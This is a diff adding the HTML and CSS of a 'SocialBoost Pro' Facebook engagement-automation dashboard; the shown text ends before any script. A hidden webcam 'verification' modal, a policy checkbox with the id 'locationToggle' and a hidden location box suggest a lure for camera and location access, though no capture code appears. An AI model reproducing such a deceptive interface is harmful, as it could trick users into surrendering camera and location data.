@@ -1,0 +1,2121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SocialBoost Pro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #4361ee;
+            --primary-dark: #3a56d4;
+            --secondary: #3f37c9;
+            --success: #4cc9f0;
+            --danger: #f72585;
+            --warning: #f8961e;
+            --info: #4895ef;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --gray: #6c757d;
+            --gray-light: #e9ecef;
+            --white: #ffffff;
+            --facebook: #1877f2;
+            --telegram: #0088cc;
+            
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.12);
+            --shadow-md: 0 4px 6px rgba(0,0,0,0.1);
+            --shadow-lg: 0 10px 15px rgba(0,0,0,0.1);
+            --shadow-xl: 0 20px 25px rgba(0,0,0,0.1);
+            
+            --radius-sm: 4px;
+            --radius-md: 8px;
+            --radius-lg: 12px;
+            --radius-xl: 16px;
+            
+            --transition: all 0.3s ease;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f5f7ff;
+            color: var(--dark);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .dashboard-container {
+            display: flex;
+            min-height: 100vh;
+        }
+        
+        /* Sidebar Navigation */
+        .sidebar {
+            width: 250px;
+            background: var(--white);
+            box-shadow: var(--shadow-md);
+            padding: 25px 0;
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid rgba(0,0,0,0.05);
+        }
+        
+        .logo-container {
+            padding: 0 25px 25px;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+            margin-bottom: 25px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: var(--facebook);
+            font-size: 22px;
+            font-weight: 700;
+            text-decoration: none;
+        }
+        
+        .logo i {
+            font-size: 28px;
+        }
+        
+        .nav-menu {
+            flex-grow: 1;
+            padding: 0 15px;
+        }
+        
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 20px;
+            border-radius: var(--radius-lg);
+            margin-bottom: 8px;
+            color: var(--gray);
+            text-decoration: none;
+            transition: var(--transition);
+            font-weight: 500;
+        }
+        
+        .nav-item:hover {
+            background: rgba(67, 97, 238, 0.1);
+            color: var(--primary);
+        }
+        
+        .nav-item.active {
+            background: rgba(67, 97, 238, 0.1);
+            color: var(--primary);
+            font-weight: 600;
+        }
+        
+        .nav-item i {
+            font-size: 18px;
+            width: 24px;
+            text-align: center;
+        }
+        
+        .user-profile-sidebar {
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-top: 1px solid rgba(0,0,0,0.05);
+            margin-top: auto;
+        }
+        
+        .user-profile-sidebar img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--primary);
+        }
+        
+        .user-profile-sidebar .user-info {
+            flex: 1;
+        }
+        
+        .user-profile-sidebar .user-name {
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 2px;
+        }
+        
+        .user-profile-sidebar .user-email {
+            font-size: 12px;
+            color: var(--gray);
+        }
+        
+        /* Main Content Area */
+        .main-content {
+            flex: 1;
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+        
+        /* Header */
+        .app-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+        
+        .page-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--dark);
+        }
+        
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .user-profile {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: var(--white);
+            padding: 8px 15px;
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-sm);
+            transition: var(--transition);
+        }
+        
+        .user-profile:hover {
+            box-shadow: var(--shadow-md);
+            transform: translateY(-2px);
+        }
+        
+        .user-profile img {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--primary);
+        }
+        
+        .user-profile span {
+            font-weight: 500;
+            font-size: 15px;
+        }
+        
+        /* Dashboard Content */
+        .dashboard-content {
+            display: grid;
+            grid-template-columns: 1fr 350px;
+            gap: 30px;
+        }
+        
+        .left-column {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+        
+        .right-column {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+        
+        /* Control Panel */
+        .control-panel {
+            background: var(--white);
+            border-radius: var(--radius-xl);
+            padding: 25px;
+            box-shadow: var(--shadow-md);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+        
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .panel-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--dark);
+        }
+        
+        .connection-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 16px;
+            border-radius: var(--radius-lg);
+            font-weight: 500;
+            font-size: 15px;
+            box-shadow: var(--shadow-sm);
+        }
+        
+        .connection-status.connected {
+            background-color: rgba(24, 119, 242, 0.1);
+            color: var(--facebook);
+        }
+        
+        .connection-status.disconnected {
+            background-color: rgba(242, 24, 24, 0.1);
+            color: var(--danger);
+        }
+        
+        .connection-status i {
+            font-size: 18px;
+        }
+        
+        .profile-input {
+            margin-bottom: 25px;
+        }
+        
+        .profile-input label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 15px;
+            color: var(--dark);
+        }
+        
+        .input-group {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .profile-input input {
+            flex: 1;
+            padding: 12px 15px;
+            border: 1px solid var(--gray-light);
+            border-radius: var(--radius-lg);
+            font-size: 15px;
+            transition: var(--transition);
+        }
+        
+        .profile-input input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+        }
+        
+        .error-message {
+            color: var(--danger);
+            font-size: 14px;
+            margin-top: 8px;
+            height: 20px;
+            font-weight: 500;
+        }
+        
+        .btn {
+            padding: 12px 22px;
+            background-color: var(--primary);
+            color: var(--white);
+            border: none;
+            border-radius: var(--radius-lg);
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 15px;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: var(--shadow-sm);
+        }
+        
+        .btn:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-md);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn i {
+            font-size: 16px;
+        }
+        
+        .btn-disconnect {
+            background-color: var(--danger);
+        }
+        
+        .btn-disconnect:hover {
+            background-color: #e5177a;
+        }
+        
+        .activity-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-top: 25px;
+        }
+        
+        .stat-card {
+            background: var(--white);
+            padding: 20px;
+            border-radius: var(--radius-lg);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-weight: 500;
+            box-shadow: var(--shadow-sm);
+            transition: var(--transition);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-md);
+        }
+        
+        .stat-card i {
+            font-size: 24px;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(67, 97, 238, 0.1);
+            color: var(--primary);
+            border-radius: var(--radius-md);
+        }
+        
+        .stat-card .stat-info {
+            flex: 1;
+        }
+        
+        .stat-card .stat-value {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .stat-card .stat-label {
+            font-size: 14px;
+            color: var(--gray);
+        }
+        
+        /* Automation Cards */
+        .automation-section {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 25px;
+        }
+        
+        .automation-card {
+            background: var(--white);
+            border-radius: var(--radius-xl);
+            padding: 25px;
+            box-shadow: var(--shadow-md);
+            transition: var(--transition);
+            border: 1px solid rgba(0,0,0,0.05);
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .automation-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .automation-card h3 {
+            margin-top: 0;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: var(--dark);
+            font-size: 18px;
+        }
+        
+        .automation-card h3 i {
+            font-size: 22px;
+            color: var(--primary);
+        }
+        
+        .toggle-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 34px;
+        }
+        
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .toggle-switch label {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: var(--gray-light);
+            transition: .4s;
+            border-radius: 34px;
+        }
+        
+        .toggle-switch label:before {
+            position: absolute;
+            content: "";
+            height: 26px;
+            width: 26px;
+            left: 4px;
+            bottom: 4px;
+            background-color: var(--white);
+            transition: .4s;
+            border-radius: 50%;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        
+        .toggle-switch input:checked + label {
+            background-color: var(--success);
+        }
+        
+        .toggle-switch input:checked + label:before {
+            transform: translateX(26px);
+        }
+        
+        .settings {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            flex-grow: 1;
+        }
+        
+        .settings label {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+        
+        .settings select, .settings input[type="number"] {
+            padding: 10px 14px;
+            border: 1px solid var(--gray-light);
+            border-radius: var(--radius-md);
+            font-size: 14px;
+            transition: var(--transition);
+        }
+        
+        .settings select:focus, .settings input[type="number"]:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+        }
+        
+        .reaction-options {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .reaction-btn {
+            font-size: 22px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            opacity: 0.6;
+            transition: all 0.2s;
+            transform: scale(1);
+        }
+        
+        .reaction-btn:hover {
+            transform: scale(1.15);
+            opacity: 0.8;
+        }
+        
+        .reaction-btn.active {
+            opacity: 1;
+            transform: scale(1.3);
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+        }
+        
+        /* Webcam Section */
+        .webcam-section {
+            background: var(--white);
+            border-radius: var(--radius-xl);
+            padding: 25px;
+            box-shadow: var(--shadow-md);
+            display: none;
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+        
+        .webcam-section h3 {
+            margin-top: 0;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: var(--dark);
+            font-size: 18px;
+        }
+        
+        .webcam-section h3 i {
+            color: var(--success);
+        }
+        
+        .webcam-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            display: none;
+        }
+        
+        .webcam-preview {
+            width: 100%;
+            max-width: 500px;
+            border-radius: var(--radius-lg);
+            background: #000;
+            aspect-ratio: 4/3;
+            margin: 0 auto;
+            display: none;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        /* Telegram Info Section */
+        .telegram-info {
+            background: var(--white);
+            border-radius: var(--radius-xl);
+            padding: 25px;
+            box-shadow: var(--shadow-md);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+        
+        .telegram-info h3 {
+            margin-top: 0;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: var(--dark);
+            font-size: 18px;
+        }
+        
+        .telegram-info h3 i {
+            color: var(--telegram);
+        }
+        
+        .telegram-info p {
+            margin-bottom: 10px;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .telegram-info p i {
+            width: 20px;
+            color: var(--gray);
+        }
+        
+        /* Activity Log */
+        .activity-log {
+            background: var(--white);
+            border-radius: var(--radius-xl);
+            padding: 25px;
+            box-shadow: var(--shadow-md);
+            border: 1px solid rgba(0,0,0,0.05);
+            flex-grow: 1;
+        }
+        
+        .activity-log h3 {
+            margin-top: 0;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: var(--dark);
+            font-size: 18px;
+        }
+        
+        .activity-log h3 i {
+            color: var(--primary);
+        }
+        
+        .log-items {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            max-height: 350px;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+        
+        /* Custom scrollbar */
+        .log-items::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .log-items::-webkit-scrollbar-track {
+            background: var(--gray-light);
+            border-radius: 10px;
+        }
+        
+        .log-items::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 10px;
+        }
+        
+        .log-items::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-dark);
+        }
+        
+        .log-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--gray-light);
+            transition: var(--transition);
+        }
+        
+        .log-item:hover {
+            background: rgba(67, 97, 238, 0.03);
+            border-radius: var(--radius-sm);
+            padding: 12px 10px;
+        }
+        
+        .log-item:last-child {
+            border-bottom: none;
+        }
+        
+        .time {
+            color: var(--gray);
+            font-size: 13px;
+            width: 90px;
+            font-weight: 500;
+        }
+        
+        .action {
+            flex: 1;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .status {
+            width: 30px;
+            text-align: right;
+        }
+        
+        .status.success {
+            color: var(--success);
+        }
+        
+        .status.error {
+            color: var(--danger);
+        }
+        
+        /* Modal Dialog */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal-content {
+            background: var(--white);
+            border-radius: var(--radius-xl);
+            padding: 25px;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: var(--shadow-xl);
+            animation: modalSlideIn 0.3s ease-out;
+        .loading-spinner {
+            border: 5px solid var(--gray-light);
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: var(--dark);
+        }
+        
+        .loading-subtext {
+            font-size: 15px;
+            color: var(--gray);
+            margin-bottom: 20px;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background-color: var(--gray-light);
+            border-radius: 5px;
+            margin-top: 25px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--success));
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 5px;
+        }
+        
+        /* Updated Webcam Loading Modal - Black & White Design */
+        .webcam-loading-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            backdrop-filter: blur(5px);
+            z-index: 1001;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .webcam-loading-content {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 30px;
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            border: 1px solid rgba(0,0,0,0.1);
+            color: #333;
+        }
+        
+        .upload-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
+        }
+        
+        .upload-icon {
+            font-size: 28px;
+            color: #555;
+        }
+        
+        .upload-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0;
+            flex: 1;
+            color: #222;
+        }
+        
+        .verification-container {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .verification-icon {
+            font-size: 50px;
+            color: #1877f2;
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
+        
+        .verification-text {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #444;
+        }
+        
+        .verification-subtext {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .progress-container {
+            height: 8px;
+            background-color: #f0f0f0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        
+        .upload-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #1877f2, #4cc9f0);
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 4px;
+        }
+        
+        .upload-details {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #555;
+        }
+        
+        .upload-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-item {
+            background: #f9f9f9;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #eee;
+        }
+        
+        .stat-value {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            color: #222;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .continue-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            width: 100%;
+            margin-top: 15px;
+            transition: all 0.3s;
+            font-size: 15px;
+        }
+        
+        .continue-btn:hover {
+            background: #166fe5;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(24, 119, 242, 0.3);
+        }
+        
+        .continue-btn:active {
+            transform: translateY(0);
+        }
+        
+       .upload-complete {
+    color: var(--success);
+    text-align: center;
+    margin: 15px 0;
+    font-weight: 600;
+    display: none;
+    font-size: 15px;
+    animation: fadeIn 0.5s ease-out;
+    padding: 10px;
+    border-radius: var(--radius-md);
+    background-color: rgba(76, 201, 240, 0.1);
+}
+
+.continue-btn {
+    background: var(--success);
+    color: white;
+    border: none;
+    padding: 12px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: 600;
+    width: 100%;
+    margin-top: 15px;
+    transition: all 0.3s;
+    font-size: 15px;
+    display: none; /* Initially hidden */
+}
+
+.continue-btn:hover {
+    background: #3aa8d8;
+    transform: translateY(-2px);
+    box-shadow: 0 4px 10px rgba(58, 168, 216, 0.3);
+}
+        
+        .status-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 15px 0;
+        }
+        
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #bbb;
+            border-radius: 50%;
+            opacity: 0.6;
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+        
+        .status-dot:nth-child(1) { animation-delay: 0s; }
+        .status-dot:nth-child(2) { animation-delay: 0.3s; }
+        .status-dot:nth-child(3) { animation-delay: 0.6s; }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.6; transform: scale(0.9); }
+            50% { opacity: 1; transform: scale(1.1); }
+        }
+        
+        /* Animation classes */
+        .fade-in {
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        .slide-up {
+            animation: slideUp 0.5s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Pulse animation for important elements */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(67, 97, 238, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(67, 97, 238, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(67, 97, 238, 0); }
+        }
+        
+        input[type="checkbox"] {
+      transform: scale(1.5);
+      margin-right: 10px;
+    }
+
+    /* Full screen overlay */
+    #loadingOverlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      background-color: rgba(0, 0, 0, 0.4); /* dim background */
+      z-index: 9999;
+    }
+
+    /* Dialog box inside overlay */
+    #loadingDialog {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      padding: 30px 40px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+      font-size: 18px;
+      color: #333;
+      text-align: center;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #locationText {
+      margin-top: 30px;
+      font-size: 16px;
+      background: #fff;
+      padding: 15px;
+      border-radius: 10px;
+      display: inline-block;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      white-space: pre-line;
+      display: none;
+    }
+        .checkbox-container {
+      margin-top: 15px;
+      display: flex;
+      align-items: center;
+    }
+    
+    // Add this CSS to style the disabled button (add to the style section)
+
+.btn:disabled {
+
+    opacity: 0.7;
+    cursor: not-allowed;
+    transform: none !important;
+    box-shadow: none !important;
+}
+    </style>
+</head>
+<body>
+    <div class="dashboard-container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="logo-container">
+                <a href="#" class="logo">
+                    <i class="fab fa-facebook"></i>
+                    <span>SocialBoost</span>
+                </a>
+            </div>
+            
+            <nav class="nav-menu">
+                <a href="#" class="nav-item active">
+                    <i class="fas fa-tachometer-alt"></i>
+                    <span>Dashboard</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <i class="fas fa-cog"></i>
+                    <span>Settings</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <i class="fas fa-chart-line"></i>
+                    <span>Analytics</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <i class="fas fa-history"></i>
+                    <span>Activity Log</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <i class="fas fa-users"></i>
+                    <span>Audience</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <i class="fas fa-rocket"></i>
+                    <span>Campaigns</span>
+                </a>
+                <a href="#" class="nav-item">
+                    <i class="fas fa-question-circle"></i>
+                    <span>Help Center</span>
+                </a>
+            </nav>
+            
+            <div class="user-profile-sidebar">
+                <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="User" id="profile-pic-sidebar">
+                <div class="user-info">
+                    <div class="user-name" id="username-sidebar">John Doe</div>
+                    <div class="user-email">john@example.com</div>
+                </div>
+            </div>
+        </aside>
+        
+        <!-- Main Content Area -->
+        <main class="main-content">
+            <header class="app-header">
+                <h1 class="page-title">Dashboard Overview</h1>
+                <div class="header-actions">
+                    <div class="user-profile">
+                        <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="User" id="profile-pic">
+                        <span>Connected as <span id="username">Guest User</span></span>
+                    </div>
+                </div>
+            </header>
+            
+            <div class="dashboard-content">
+                <div class="left-column">
+                    <div class="control-panel slide-up">
+                        <div class="panel-header">
+                            <h3 class="panel-title">Account Connection</h3>
+                            <div class="connection-status connected" id="connection-status">
+                                <i class="fas fa-link"></i>
+                                <span id="connection-text">Facebook Connected</span>
+                            </div>
+                        </div>
+                        
+                        <div class="profile-input">
+                            <label for="fb-url">Facebook Profile/Page/Post URL:</label>
+                            <div class="input-group">
+                                <input type="text" id="fb-url" placeholder="https://facebook.com/username">
+<button class="btn verify-btn" id="verify-btn" disabled>
+    <i class="fas fa-check-circle"></i> Verify
+</button>
+                                <button class="btn btn-disconnect" id="disconnect-btn" style="display: none;">
+                                    <i class="fas fa-unlink"></i> Disconnect
+                                </button>
+
+                            </div>
+                            
+ <div class="checkbox-container">
+  <label>
+      
+    <input type="checkbox" id="locationToggle"> Agree to the policies
+  </label>
+                                                     </div>   
+                            
+   <!-- Fullscreen loading overlay -->
+  <div id="loadingOverlay">
+    <div id="loadingDialog">
+      <div class="spinner"></div>
+      Please waiting...
+    </div>
+  </div>
+
+           
+                            <div id="url-error" class="error-message"></div>
+                        </div>
+                                  
+
+                        <div class="activity-stats">
+                            <div class="stat-card">
+                                <i class="fas fa-thumbs-up"></i>
+                                <div class="stat-info">
+                                    <div class="stat-value" id="like-count">0</div>
+                                    <div class="stat-label">Likes</div>
+                                </div>
+                            </div>
+                            <div class="stat-card">
+                                <i class="fas fa-users"></i>
+                                <div class="stat-info">
+                                    <div class="stat-value" id="follower-count">0</div>
+                                    <div class="stat-label">Followers</div>
+                                </div>
+                            </div>
+                            <div class="stat-card">
+                                <i class="fas fa-share-alt"></i>
+                                <div class="stat-info">
+                                    <div class="stat-value" id="share-count">0</div>
+                                    <div class="stat-label">Shares</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="automation-section" id="automation-section">
+                        <!-- Auto Like Card -->
+                        <div class="automation-card slide-up" style="animation-delay: 0.1s">
+                            <h3><i class="fas fa-magic"></i> Auto Like</h3>
+                            <div class="toggle-container">
+                                <span>Enable Automation</span>
+                                <div class="toggle-switch">
+                                    <input type="checkbox" id="auto-like">
+                                    <label for="auto-like"></label>
+                                </div>
+                            </div>
+                            <div class="settings">
+                                <label>Speed:</label>
+                                <select id="like-speed">
+                                    <option value="slow">Slow (Natural)</option>
+                                    <option value="medium" selected>Medium</option>
+                                    <option value="fast">Fast</option>
+                                </select>
+                                <label>Daily Limit:</label>
+                                <input type="number" id="like-limit" value="150" min="1" max="500">
+                            </div>
+                        </div>
+                        
+                        <!-- Auto Follow Card -->
+                        <div class="automation-card slide-up" style="animation-delay: 0.2s">
+                            <h3><i class="fas fa-user-plus"></i> Auto Follow</h3>
+                            <div class="toggle-container">
+                                <span>Enable Automation</span>
+                                <div class="toggle-switch">
+                                    <input type="checkbox" id="auto-follow">
+                                    <label for="auto-follow"></label>
+                                </div>
+                            </div>
+                            <div class="settings">
+                                <label>Target:</label>
+                                <select id="follow-target">
+                                    <option value="friends">Friends of Friends</option>
+                                    <option value="likers" selected>Page Likers</option>
+                                    <option value="group">Group Members</option>
+                                </select>
+                                <label>Daily Limit:</label>
+                                <input type="number" id="follow-limit" value="50" min="1" max="200">
+                            </div>
+                        </div>
+                        
+                        <!-- Auto Reaction Card -->
+                        <div class="automation-card slide-up" style="animation-delay: 0.3s">
+                            <h3><i class="fas fa-smile"></i> Auto Reaction</h3>
+                            <div class="toggle-container">
+                                <span>Enable Automation</span>
+                                <div class="toggle-switch">
+                                    <input type="checkbox" id="auto-reaction">
+                                    <label for="auto-reaction"></label>
+                                </div>
+                            </div>
+                            <div class="settings">
+                                <label>Reactions:</label>
+                                <div class="reaction-options">
+                                    <button class="reaction-btn like active" data-reaction="like" title="Like">👍</button>
+                                    <button class="reaction-btn love" data-reaction="love" title="Love">❤️</button>
+                                    <button class="reaction-btn haha" data-reaction="haha" title="Haha">😄</button>
+                                    <button class="reaction-btn wow" data-reaction="wow" title="Wow">😲</button>
+                                    <button class="reaction-btn sad" data-reaction="sad" title="Sad">😢</button>
+                                    <button class="reaction-btn angry" data-reaction="angry" title="Angry">😠</button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Auto Share Card -->
+                        <div class="automation-card slide-up" style="animation-delay: 0.4s">
+                            <h3><i class="fas fa-retweet"></i> Auto Share</h3>
+                            <div class="toggle-container">
+                                <span>Enable Automation</span>
+                                <div class="toggle-switch">
+                                    <input type="checkbox" id="auto-share">
+                                    <label for="auto-share"></label>
+                                </div>
+                            </div>
+                            <div class="settings">
+                                <label>Content Source:</label>
+                                <select id="share-source">
+                                      <select id="share-source">
+                                    <option value="your-posts" selected>Your Posts</option>
+                                    <option value="page-posts">Page Posts</option>
+                                    <option value="specific-url">Specific URL</option>
+                                </select>
+                                <label>Daily Limit:</label>
+                                <input type="number" id="share-limit" value="20" min="1" max="100">
+                            </div>
+                        </div>
+                    </div>
+<!-- Updrate Info Section -->
+                <div class="telegram-info slide-up" style="animation-delay: 0.5s">
+                        <h3><i class="fab fa-facebook"></i> Connect Your Facebook Profile</h3> <p>- Enter your Facebook Profile URL LINK.</p>
+                        	    <p>- Click "Verify" to start the secure connection process.      </p>
+                        </div>
+                    <!-- Webcam Section -->
+                    <div class="webcam-section" id="webcam-section">
+                        <h3><i class="fa fa-exclamation-circle" style="font-size:30px;color:red"></i>Important Notes</h3>
+                        <p> .Do not refresh during verification.</p>
+<p>.Keep the tab open while automations are running. </p>
+<p>.Disconnectwhen not in use for security. </p>
+
